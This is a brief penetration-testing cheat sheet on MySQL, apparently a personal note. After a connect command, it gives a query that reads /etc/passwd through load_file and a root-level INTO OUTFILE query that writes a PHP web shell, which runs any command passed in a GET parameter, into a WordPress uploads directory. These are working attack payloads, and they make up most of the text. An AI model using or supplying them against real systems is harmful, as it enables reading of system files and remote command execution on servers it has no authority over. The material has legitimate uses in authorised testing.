#service #db

### Usage
```bash
mysql -h <ip_address> -u <user>
```

If you have read permission you can list files
```bash
MySQL > select load_file("/etc/passwd");
```

`root` user

```sql
Select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/https/blogblog/wp-content/uploads/shell.php"
```